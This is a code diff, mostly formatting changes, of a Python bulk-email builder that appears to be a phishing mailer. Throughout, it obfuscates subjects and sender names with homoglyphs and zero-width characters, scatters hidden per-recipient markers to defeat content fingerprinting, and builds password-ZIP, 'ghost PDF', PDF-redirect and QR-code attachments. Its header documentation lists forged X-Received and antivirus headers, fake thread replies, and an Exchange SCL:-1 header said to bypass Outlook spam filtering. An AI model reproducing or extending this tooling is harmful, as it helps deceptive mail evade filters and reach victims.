+                "jpeg": "jpeg",
+                "jpg": "jpeg",
+                "png": "png",
+                "gif": "gif",
+                "webp": "webp",
+                "svg+xml": "png",
+            }.get(subtype, "png")
             if len(img_data) < 100:
                 return m.group(0)  # skip tiny/empty responses
-            cid = _rand_alphanum(8) + '@mail'
+            cid = _rand_alphanum(8) + "@mail"
             part = MIMEImage(img_data, _subtype=subtype)
-            part.add_header('Content-ID', f'<{cid}>')
-            part.add_header('Content-Disposition', 'inline')
+            part.add_header("Content-ID", f"<{cid}>")
+            part.add_header("Content-Disposition", "inline")
             img_parts.append((part, cid))
             seen_urls[url] = cid
             log.debug("[mime_builder] CID embedded: %s → cid:%s", url[:60], cid)
@@ -2371,7 +2634,9 @@ def _embed_images_as_cid(html: str) -> tuple:
     # Match src="..." in img tags, handling single/double quotes
     modified = re.sub(
         r'(<img\b[^>]*?)\bsrc=(["\'])([^"\'>]+)\2([^>]*?>)',
-        _replace_src, html, flags=re.IGNORECASE | re.DOTALL
+        _replace_src,
+        html,
+        flags=re.IGNORECASE | re.DOTALL,
     )
     return modified, img_parts
 
@@ -2380,22 +2645,23 @@ def _embed_images_as_cid(html: str) -> tuple:
 # MAIN BUILDER
 # ═══════════════════════════════════════════════════════════
 
+
 def build_message(
-    lead:           dict,
-    sender:         dict,
-    subject:        str,
-    html:           str,
-    plain:          str       = None,
-    dlv:            dict      = None,
-    custom_hdrs:    list      = None,
-    attachments:    dict      = None,
-    ehlo_domain:    str       = None,
-    msg_id_domain:  str       = None,
-    preheader:      str       = None,
-    inject_unsub:   bool      = True,
-    ensure_html:    bool      = True,
-    smtp_auth_email: str      = None,
-    envelope_from:   str      = None,
+    lead: dict,
+    sender: dict,
+    subject: str,
+    html: str,
+    plain: str = None,
+    dlv: dict = None,
+    custom_hdrs: list = None,
+    attachments: dict = None,
+    ehlo_domain: str = None,
+    msg_id_domain: str = None,
+    preheader: str = None,
+    inject_unsub: bool = True,
+    ensure_html: bool = True,
+    smtp_auth_email: str = None,
+    envelope_from: str = None,
 ) -> tuple:
     """
     Build a complete MIME email message ready for sending.
@@ -2422,25 +2688,27 @@ def build_message(
             'qr_cid':       str | None  — Content-ID for inline #QRCODE embedding
             'warnings':     list[str]   — non-fatal build warnings
     """
-    dlv          = dlv or {}
-    custom_hdrs  = custom_hdrs or []
-    attachments  = attachments or {}
+    dlv = dlv or {}
+    custom_hdrs = custom_hdrs or []
+    attachments = attachments or {}
 
-    lead_email  = _clean_header_value((lead.get("email") or "").strip(), 254)
-    lead_name   = _clean_header_value((lead.get("name") or "").strip(), 120)
-    from_email  = _clean_header_value((sender.get("fromEmail") or "").strip(), 254)
-    from_name   = _clean_header_value((sender.get("fromName") or "").strip(), 120)
-    reply_to    = _clean_header_value((sender.get("replyTo") or "").strip(), 254)
+    lead_email = _clean_header_value((lead.get("email") or "").strip(), 254)
+    lead_name = _clean_header_value((lead.get("name") or "").strip(), 120)
+    from_email = _clean_header_value((sender.get("fromEmail") or "").strip(), 254)
+    from_name = _clean_header_value((sender.get("fromName") or "").strip(), 120)
+    reply_to = _clean_header_value((sender.get("replyTo") or "").strip(), 254)
     from_domain = from_email.split("@")[-1] if "@" in from_email else ""
-    ehlo        = ehlo_domain or from_domain or "mail.example.com"
+    ehlo = ehlo_domain or from_domain or "mail.example.com"
 
     # Detect ISP mode: envelope_from on a different domain than From
-    _env_domain = envelope_from.split("@")[-1] if envelope_from and "@" in envelope_from else ""
+    _env_domain = (
+        envelope_from.split("@")[-1] if envelope_from and "@" in envelope_from else ""
+    )
     is_isp_mode = bool(_env_domain and _env_domain.lower() != from_domain.lower())
 
-    warnings    = []
+    warnings = []
     zip_password = None
-    qr_cid       = None
+    qr_cid = None
 
     # ── Validate minimum requirements ──
     if not lead_email:
@@ -2460,7 +2728,7 @@ def build_message(
     if _subj_enc == "random":
         _subj_enc = random.choice(["zerowidth", "homoglyph", "mixed", "none"])
     if _encrypt_content or _subj_enc in ("homoglyph", "mixed"):
-        subject   = _homoglyph_encode(subject)
+        subject = _homoglyph_encode(subject)
         from_name = _homoglyph_encode(from_name)
     if _encrypt_content or _subj_enc in ("zerowidth", "mixed"):
         subject = _zero_width_obfuscate(subject)
@@ -2469,7 +2737,7 @@ def build_message(
     # ── Link encoding (resolve [LINK] / [SF_*] tags before any processing) ──
     # Must run first — before HTML structure wrapping, image embedding, etc.
     # Detects the encoding method from which [SF_*] tag is present in the template.
-    _link_url    = (dlv or {}).get("linkUrl") or ""
+    _link_url = (dlv or {}).get("linkUrl") or ""
     _link_method = 0  # default: plain
     if _HAS_LINK_ENCODER and working_html and _link_url:
         try:
@@ -2488,7 +2756,11 @@ def build_message(
     # Only apply HTML structure wrapping if the content actually has HTML tags.
     # Wrapping plain "Hi" in <!DOCTYPE html> then stripping it back to plain
     # injects CSS junk into the plain-text part.
-    _content_has_html = bool(re.search(r'<(html|body|div|p|table|td|span|a|br|img|h[1-6])\b', working_html, re.I))
+    _content_has_html = bool(
+        re.search(
+            r"<(html|body|div|p|table|td|span|a|br|img|h[1-6])\b", working_html, re.I
+        )
+    )
     if ensure_html and _content_has_html:
         working_html = _ensure_html_structure(working_html)
     if preheader and _content_has_html:
@@ -2505,7 +2777,10 @@ def build_message(
     # embedImages=False          → disabled (keep external URLs)
     _cid_parts = []
     _embed_mode = dlv.get("embedImages", True)
-    _has_ext_imgs = bool(working_html and re.search(r'<img[^>]+src=["\']https?://', working_html, re.IGNORECASE))
+    _has_ext_imgs = bool(
+        working_html
+        and re.search(r'<img[^>]+src=["\']https?://', working_html, re.IGNORECASE)
+    )
     if _embed_mode and _has_ext_imgs:
         if _embed_mode == "cid":
             try:
@@ -2527,26 +2802,32 @@ def build_message(
 
     # ── Unsubscribe footer injection ──
     if inject_unsub and dlv.get("listUnsub"):
-        unsub_url   = (dlv.get("unsubUrl") or "").replace("#EMAIL", lead_email)
+        unsub_url = (dlv.get("unsubUrl") or "").replace("#EMAIL", lead_email)
         unsub_email = dlv.get("unsubEmail") or ""
-        working_html = _inject_unsub_footer(working_html, unsub_url, unsub_email, lead_email)
+        working_html = _inject_unsub_footer(
+            working_html, unsub_url, unsub_email, lead_email
+        )
 
     # ── Per-recipient multi-point uniqueness — matches Supermailer / Mailwizz approach ──
     # Professional bulk senders scatter uniqueness at 3+ independent positions so
     # content fingerprinting fails at every layer (top comment, bottom div, plain text).
     # A single marker at the bottom can itself become a detectable pattern.
     if working_html or working_plain:
-        _uhash  = hashlib.sha256(f"{lead_email}|{from_email}".encode()).hexdigest()
-        _tok_a  = _uhash[:8]    # top marker
-        _tok_b  = _uhash[8:16]  # bottom marker
-        _tok_c  = _uhash[16:24] # plain text marker
+        _uhash = hashlib.sha256(f"{lead_email}|{from_email}".encode()).hexdigest()
+        _tok_a = _uhash[:8]  # top marker
+        _tok_b = _uhash[8:16]  # bottom marker
+        _tok_c = _uhash[16:24]  # plain text marker
 
         if working_html:
             # Point 1 — invisible HTML comment immediately after <body> open tag
-            _top_cmt = f'<!--r:{_tok_a}-->'
-            if re.search(r'<body[^>]*>', working_html, re.I):
+            _top_cmt = f"<!--r:{_tok_a}-->"
+            if re.search(r"<body[^>]*>", working_html, re.I):
                 working_html = re.sub(
-                    r'(<body(?:[^>]*)>)', rf'\1{_top_cmt}', working_html, count=1, flags=re.I
+                    r"(<body(?:[^>]*)>)",
+                    rf"\1{_top_cmt}",
+                    working_html,
+                    count=1,
+                    flags=re.I,
                 )
             else:
                 working_html = _top_cmt + working_html
@@ -2556,9 +2837,9 @@ def build_message(
                 f'<div style="display:none;font-size:1px;line-height:1px;'
                 f'max-height:0;max-width:0;opacity:0;overflow:hidden"><!--m:{_tok_b}--></div>'
             )
-            if re.search(r'</body>', working_html, re.I):
+            if re.search(r"</body>", working_html, re.I):
                 working_html = re.sub(
-                    r'</body>', f'{_bot_div}</body>', working_html, count=1, flags=re.I
+                    r"</body>", f"{_bot_div}</body>", working_html, count=1, flags=re.I
                 )
             else:
                 working_html += _bot_div
@@ -2567,8 +2848,8 @@ def build_message(
         # position.  Invisible to readers, breaks content-hash fingerprinting of the
         # plain text part (which filters check independently of HTML).
         if working_plain:
-            _zwnj    = '‌'
-            _pt_pos  = int(_tok_c[:4], 16) % max(1, len(working_plain))
+            _zwnj = "‌"
+            _pt_pos = int(_tok_c[:4], 16) % max(1, len(working_plain))
             working_plain = working_plain[:_pt_pos] + _zwnj + working_plain[_pt_pos:]
 
     # ── Build attachment parts first (may need to modify html for QR/ZIP) ──
@@ -2601,7 +2882,9 @@ def build_message(
     zip_cfg = attachments.get("zip")
     if zip_cfg:
         try:
-            zip_part, zip_password = _build_zip_attachment(zip_cfg, lead, sender, working_html)
+            zip_part, zip_password = _build_zip_attachment(
+                zip_cfg, lead, sender, working_html
+            )
             if zip_part:
                 attachment_parts.append(("zip", zip_part, None))
         except Exception as e:
@@ -2615,15 +2898,28 @@ def build_message(
             nested_parts = []
             for nid in nested_ids:
                 if nid == "ics" and attachments.get("ics"):
-                    np = _build_ics_attachment(attachments["ics"], lead, sender, subject)
-                    if np: nested_parts.append(np)
+                    np = _build_ics_attachment(
+                        attachments["ics"], lead, sender, subject
+                    )
+                    if np:
+                        nested_parts.append(np)
                 elif nid == "pdf" and attachments.get("pdf"):
-                    np = _build_pdf_attachment(attachments["pdf"], working_html, lead, subject)
-                    if np: nested_parts.append(np)
+                    np = _build_pdf_attachment(
+                        attachments["pdf"], working_html, lead, subject
+                    )
+                    if np:
+                        nested_parts.append(np)
                 elif nid == "ghost_pdf" and attachments.get("ghost_pdf"):
-                    np = _build_ghost_pdf(attachments["ghost_pdf"], attachments["ghost_pdf"].get("link",""), lead.get("email",""))
-                    if np: nested_parts.append(np)
-            eml_part = _build_eml_attachment(eml_cfg, lead, sender, working_html, subject, nested_parts or None)
+                    np = _build_ghost_pdf(
+                        attachments["ghost_pdf"],
+                        attachments["ghost_pdf"].get("link", ""),
+                        lead.get("email", ""),
+                    )
+                    if np:
+                        nested_parts.append(np)
+            eml_part = _build_eml_attachment(
+                eml_cfg, lead, sender, working_html, subject, nested_parts or None
+            )
             if eml_part:
                 attachment_parts.append(("eml", eml_part, None))
         except Exception as e:
@@ -2689,7 +2985,9 @@ def build_message(
             if pdfr_part:
                 attachment_parts.append(("pdf_redirect", pdfr_part, None))
             else:
-                warnings.append("PDF redirect build failed — install reportlab: pip install reportlab")
+                warnings.append(
+                    "PDF redirect build failed — install reportlab: pip install reportlab"
+                )
         except Exception as e:
             warnings.append(f"PDF redirect build failed: {e}")
 
@@ -2697,11 +2995,15 @@ def build_message(
     html_pdf_cfg = attachments.get("html_pdf")
     if html_pdf_cfg:
         try:
-            html_pdf_part = _build_html_pdf_attachment(html_pdf_cfg, working_html, lead, sender, subject)
+            html_pdf_part = _build_html_pdf_attachment(
+                html_pdf_cfg, working_html, lead, sender, subject
+            )
             if html_pdf_part:
                 attachment_parts.append(("html_pdf", html_pdf_part, None))
             else:
-                warnings.append("HTML→PDF build failed — install weasyprint or pdfkit (wkhtmltopdf)")
+                warnings.append(
+                    "HTML→PDF build failed — install weasyprint or pdfkit (wkhtmltopdf)"
+                )
         except Exception as e:
             warnings.append(f"HTML→PDF failed: {e}")
 
@@ -2710,15 +3012,23 @@ def build_message(
     if ghost_cfg:
         try:
             _ghost_link = ghost_cfg.get("link") or (
-                opts_links[0] if (opts_links := [
-                    lk["url"] for lk in (attachments.get("_links") or []) if lk.get("url")
-                ]) else ""
+                opts_links[0]
+                if (
+                    opts_links := [
+                        lk["url"]
+                        for lk in (attachments.get("_links") or [])
+                        if lk.get("url")
+                    ]
+                )
+                else ""
             )
             ghost_part = _build_ghost_pdf(ghost_cfg, _ghost_link, lead_email)
             if ghost_part:
                 attachment_parts.append(("ghost_pdf", ghost_part, None))
             else:
-                warnings.append("Ghost PDF build failed — install reportlab: pip install reportlab")
+                warnings.append(
+                    "Ghost PDF build failed — install reportlab: pip install reportlab"
+                )
         except Exception as e:
             warnings.append(f"Ghost PDF failed: {e}")
 
@@ -2734,12 +3044,14 @@ def build_message(
                 if img_cfg.get("inline_replace"):
                     working_html = f'<html><body><img src="cid:{img_cid}" style="max-width:100%;display:block;border:0" alt=""/></body></html>'
             else:
-                warnings.append("HTML-to-image failed — install playwright, imgkit (wkhtmltoimage), or html2image")
+                warnings.append(
+                    "HTML-to-image failed — install playwright, imgkit (wkhtmltoimage), or html2image"
+                )
         except Exception as e:
             warnings.append(f"HTML-to-image failed: {e}")
 
     # Generic file attachments (from disk paths)
-    for fa in (attachments.get("files") or []):
+    for fa in attachments.get("files") or []:
         path = fa.get("path") or ""
         name = fa.get("name") or ""
         if path:
@@ -2752,7 +3064,7 @@ def build_message(
 
     # ── Substitute #ZIP_PASSWORD in html/plain ──
     if zip_password:
-        working_html  = working_html.replace("#ZIP_PASSWORD", zip_password)
+        working_html = working_html.replace("#ZIP_PASSWORD", zip_password)
         working_plain = working_plain.replace("#ZIP_PASSWORD", zip_password)
 
     # ── Decide MIME structure ──
@@ -2769,7 +3081,9 @@ def build_message(
         attachment_parts.append(("cid_img", _cid_img_part, _cid_img_id))
 
     has_attachments = bool(attachment_parts)
-    has_inline      = any(cid for _, _, cid in attachment_parts)  # any inline part (qr, cid_img, html_image)
+    has_inline = any(
+        cid for _, _, cid in attachment_parts
+    )  # any inline part (qr, cid_img, html_image)
 
     # Detect if the "HTML" body is actually just plain text (no real HTML tags).
     # Sending multipart/alternative with an HTML part that is just "hi" is a
@@ -2799,9 +3113,10 @@ def build_message(
         # base64 HTML is a minor spam signal; QP is the standard
         from email.mime.text import MIMEText as _MT
         from email import charset as _cs
+
         _html_cs = _cs.Charset("utf-8")
         _html_cs.header_encoding = _cs.QP
-        _html_cs.body_encoding   = _cs.QP
+        _html_cs.body_encoding = _cs.QP
         _html_part = _MT.__new__(_MT)
         _html_part.__init__(working_html, "html")
         _html_part.set_charset(_html_cs)
@@ -2840,13 +3155,17 @@ def build_message(
         _display_name = _zero_width_obfuscate(_display_name)
     if _display_name:
         import email.utils as _eu
-        _needs_utf8 = dlv.get("hideFromEmail") or not all(ord(c) < 128 for c in _display_name)
+
+        _needs_utf8 = dlv.get("hideFromEmail") or not all(
+            ord(c) < 128 for c in _display_name
+        )
         if _needs_utf8:
             from email.header import Header as _Hdr
+
             if dlv.get("hideFromEmail"):
                 # Display-name only — omit <email> so inbox shows just the name.
                 # Delivery still uses the envelope MAIL FROM.
-                msg["From"] = _Hdr(_display_name, 'utf-8').encode()
+                msg["From"] = _Hdr(_display_name, "utf-8").encode()
             else:
                 msg["From"] = f"{_Hdr(_display_name, 'utf-8').encode()} <{from_email}>"
         else:
@@ -2862,6 +3181,7 @@ def build_message(
             msg["To"] = f'"{lead_name}" <{lead_email}>'
         except UnicodeEncodeError:
             from email.header import Header
+
             encoded_lname = Header(lead_name, "utf-8").encode()
             msg["To"] = f"{encoded_lname} <{lead_email}>"
     else:
@@ -2873,6 +3193,7 @@ def build_message(
         msg["Subject"] = subject
     except (UnicodeEncodeError, AttributeError):
         from email.header import Header
+
         msg["Subject"] = Header(subject or "", "utf-8").encode()
 
     # Thread-Topic intentionally omitted — not present in real ESP sends, fingerprints bulk senders
@@ -2882,6 +3203,7 @@ def build_message(
     # to bypass relay DKIM coverage. Works for both ISP relay and direct MX modes.
     if reply_to and reply_to != from_email:
         import email.utils as _eu_rt
+
         _rt_name, _rt_addr = _eu_rt.parseaddr(reply_to.strip())
         if not _rt_addr:
             # Plain email address with no name
@@ -2891,7 +3213,9 @@ def build_message(
             # Use name from Reply-To field; fall back to From display name so
             # recipients see a name (not raw email) when they hit Reply.
             _rt_display = _rt_name or from_name or ""
-            _rt_full = _eu_rt.formataddr((_rt_display, _rt_addr)) if _rt_display else _rt_addr
+            _rt_full = (
+                _eu_rt.formataddr((_rt_display, _rt_addr)) if _rt_display else _rt_addr
+            )
             msg._synthtel_reply_to = _rt_full
         elif reply_to.strip():
             log.warning("Invalid Reply-To skipped: %s", reply_to.strip()[:50])
@@ -2906,7 +3230,9 @@ def build_message(
             msg["Sender"] = smtp_auth_email
         else:
             # ISP mode: only set Sender: when same domain as From: (different local-part)
-            _auth_domain = smtp_auth_email.split("@")[-1].lower() if "@" in smtp_auth_email else ""
+            _auth_domain = (
+                smtp_auth_email.split("@")[-1].lower() if "@" in smtp_auth_email else ""
+            )
             _from_domain_s = from_domain.lower() if from_domain else ""
             if _auth_domain and _auth_domain == _from_domain_s:
                 msg["Sender"] = smtp_auth_email
@@ -2915,7 +3241,12 @@ def build_message(
     msg["Date"] = formatdate(localtime=False)
 
     # Message-ID — stable, standards-based format with aligned domain.
-    mid_domain = msg_id_domain or (dlv.get("msgIdDomain") if dlv.get("customMsgId") else None) or from_domain or ehlo
+    mid_domain = (
+        msg_id_domain
+        or (dlv.get("msgIdDomain") if dlv.get("customMsgId") else None)
+        or from_domain
+        or ehlo
+    )
     _msgid_style = dlv.get("msgIdStyle", "standard")
     if _msgid_style and _msgid_style != "standard":
         msg["Message-ID"] = _make_msgid_styled(_msgid_style, from_domain, ehlo)
@@ -2931,11 +3262,13 @@ def build_message(
     # detectable forgery. Let the MTA add it.
 
     # ── Deliverability headers ──
-    _apply_deliverability_headers(msg, dlv, lead_email, from_email, from_domain, ehlo, is_isp_mode=is_isp_mode)
+    _apply_deliverability_headers(
+        msg, dlv, lead_email, from_email, from_domain, ehlo, is_isp_mode=is_isp_mode
+    )
 
     # ── Custom user-defined headers (protected headers skipped with warning) ──
     for ch in custom_hdrs:
-        key   = (ch.get("key") or "").strip()
+        key = (ch.get("key") or "").strip()
         value = (ch.get("value") or "").strip()
         if not key or not value:
             continue
@@ -2956,8 +3289,8 @@ def build_message(
 
     metadata = {
         "zip_password": zip_password,
-        "qr_cid":       qr_cid,
-        "warnings":     warnings,
+        "qr_cid": qr_cid,
+        "warnings": warnings,
         "has_attachments": has_attachments,
         "attachment_count": len(attachment_parts),
     }
@@ -2971,39 +3304,39 @@ def build_message(
 
 DELIVERABILITY_HEADER_DOCS = {
     # Standard
-    "listUnsub":        "List-Unsubscribe — Required for Gmail/Yahoo bulk (>5K/day). Links to 1-click opt-out.",
-    "oneClickUnsub":    "List-Unsubscribe-Post — RFC 8058 one-click. Required for Gmail bulk certification.",
-    "xMailer":          "X-Mailer — Impersonates a known MUA (Outlook, Thunderbird). Reduces spam score.",
-    "precedence":       "Precedence: bulk/list/junk — Signals list mail to filters. Use 'bulk' for newsletters.",
-    "feedbackId":       "Feedback-ID — Gmail FBL identifier. Format: campaignID:senderID:channel:esp",
-    "organization":     "Organization — Company identity header. Adds sender legitimacy signal.",
-    "priority":         "X-Priority / Importance — Message urgency. High=1, Normal=3, Low=5.",
-    "entityRef":        "X-Entity-Ref-ID — Google deduplication token. Prevents duplicate delivery.",
+    "listUnsub": "List-Unsubscribe — Required for Gmail/Yahoo bulk (>5K/day). Links to 1-click opt-out.",
+    "oneClickUnsub": "List-Unsubscribe-Post — RFC 8058 one-click. Required for Gmail bulk certification.",
+    "xMailer": "X-Mailer — Impersonates a known MUA (Outlook, Thunderbird). Reduces spam score.",
+    "precedence": "Precedence: bulk/list/junk — Signals list mail to filters. Use 'bulk' for newsletters.",
+    "feedbackId": "Feedback-ID — Gmail FBL identifier. Format: campaignID:senderID:channel:esp",
+    "organization": "Organization — Company identity header. Adds sender legitimacy signal.",
+    "priority": "X-Priority / Importance — Message urgency. High=1, Normal=3, Low=5.",
+    "entityRef": "X-Entity-Ref-ID — Google deduplication token. Prevents duplicate delivery.",
     # Advanced
-    "listId":           "List-ID — RFC 2919. Identifies this as legitimate mailing list traffic.",
-    "feedbackIdAuto":   "Auto Feedback-ID — Generates a unique Feedback-ID per campaign automatically.",
-    "listIdAuto":       "Auto List-ID — Generates List-ID from sender domain automatically.",
-    "threadSimulate":   "Thread Simulation — Fake In-Reply-To/References. Makes filters treat as real thread reply. High inbox impact.",
-    "threadTopic":      "Thread-Topic/Index — Outlook conversation grouping headers.",
-    "autoSubmitted":    "Auto-Submitted: auto-generated — RFC 3834. Prevents OOO and auto-reply loops.",
-    "originatingIp":    "X-Originating-IP — Claimed sending IP. Some filters use for reputation lookup.",
-    "originatingIpAuto":"Auto X-Originating-IP — Generates a realistic internal IP automatically.",
-    "msExchangeHeaders":"MS Exchange Headers — X-MS-Exchange-Organization-SCL:-1 bypasses Outlook spam filter. High impact for O365 targets.",
-    "subjectEncoding":  "Subject Encoding — Obfuscate subject: none | zerowidth | homoglyph | mixed | random. Breaks keyword matchers.",
-    "msgIdStyle":       "Message-ID Style — none | standard | outlook | gmail | sendgrid | auto. Mimics real server ID formats.",
+    "listId": "List-ID — RFC 2919. Identifies this as legitimate mailing list traffic.",
+    "feedbackIdAuto": "Auto Feedback-ID — Generates a unique Feedback-ID per campaign automatically.",
+    "listIdAuto": "Auto List-ID — Generates List-ID from sender domain automatically.",
+    "threadSimulate": "Thread Simulation — Fake In-Reply-To/References. Makes filters treat as real thread reply. High inbox impact.",
+    "threadTopic": "Thread-Topic/Index — Outlook conversation grouping headers.",
+    "autoSubmitted": "Auto-Submitted: auto-generated — RFC 3834. Prevents OOO and auto-reply loops.",
+    "originatingIp": "X-Originating-IP — Claimed sending IP. Some filters use for reputation lookup.",
+    "originatingIpAuto": "Auto X-Originating-IP — Generates a realistic internal IP automatically.",
+    "msExchangeHeaders": "MS Exchange Headers — X-MS-Exchange-Organization-SCL:-1 bypasses Outlook spam filter. High impact for O365 targets.",
+    "subjectEncoding": "Subject Encoding — Obfuscate subject: none | zerowidth | homoglyph | mixed | random. Breaks keyword matchers.",
+    "msgIdStyle": "Message-ID Style — none | standard | outlook | gmail | sendgrid | auto. Mimics real server ID formats.",
     "feedbackIdCategory": "Feedback-ID Category — TRANSACTIONAL | NOTIFICATION | REGULATORY_REQUIRED. Gmail uses this for classification.",
-    "shuffleHeaders":   "Shuffle optional headers (Fisher-Yates) on each message. Prevents bulk fingerprinting by header ordering.",
+    "shuffleHeaders": "Shuffle optional headers (Fisher-Yates) on each message. Prevents bulk fingerprinting by header ordering.",
     "spamStatusHeader": "X-Spam-Status/Score — SpamAssassin pass affirmation. Signals pre-screened clean mail.",
-    "virusScanned":     "X-Virus-Scanned — Claims AV scan passed. Reduces suspicion with some filters.",
-    "contentLanguage":  "Content-Language — Locale hint. en, fr, de, es etc.",
-    "xReceived":        "X-Received — Fake transit hop header. Adds legitimacy by simulating relay.",
-    "rrvs":             "Require-Recipient-Valid-Since — RFC 7293. Prevents delivery to recycled addresses.",
-    "returnReceipt":    "Return-Receipt-To — Read receipt. Also sets Disposition-Notification-To.",
-    "complaintsTo":     "X-Complaints-To — Abuse report destination. Shows ISP you handle abuse.",
-    "errorsTo":         "Errors-To — Bounce handling address.",
-    "bimiSelector":     "BIMI-Selector — Brand Indicators for Message Identification. Hints at BIMI logo.",
-    "sensitivity":      "Sensitivity — Outlook: Personal/Private/Company-Confidential handling.",
-    "sourceHeaders":    "X-Source headers — MTA identity. Simulates Postfix/Exim origination.",
-    "msHasAttach":      "X-MS-Has-Attach — Outlook attachment indicator (used with Exchange headers).",
-    "pmTracking":       "X-PM-Message-Id — Postmark-style message ID. Some filters trust Postmark.",
+    "virusScanned": "X-Virus-Scanned — Claims AV scan passed. Reduces suspicion with some filters.",
+    "contentLanguage": "Content-Language — Locale hint. en, fr, de, es etc.",
+    "xReceived": "X-Received — Fake transit hop header. Adds legitimacy by simulating relay.",
+    "rrvs": "Require-Recipient-Valid-Since — RFC 7293. Prevents delivery to recycled addresses.",
+    "returnReceipt": "Return-Receipt-To — Read receipt. Also sets Disposition-Notification-To.",
+    "complaintsTo": "X-Complaints-To — Abuse report destination. Shows ISP you handle abuse.",
+    "errorsTo": "Errors-To — Bounce handling address.",
+    "bimiSelector": "BIMI-Selector — Brand Indicators for Message Identification. Hints at BIMI logo.",
+    "sensitivity": "Sensitivity — Outlook: Personal/Private/Company-Confidential handling.",
+    "sourceHeaders": "X-Source headers — MTA identity. Simulates Postfix/Exim origination.",
+    "msHasAttach": "X-MS-Has-Attach — Outlook attachment indicator (used with Exchange headers).",
+    "pmTracking": "X-PM-Message-Id — Postmark-style message ID. Some filters trust Postmark.",
 }
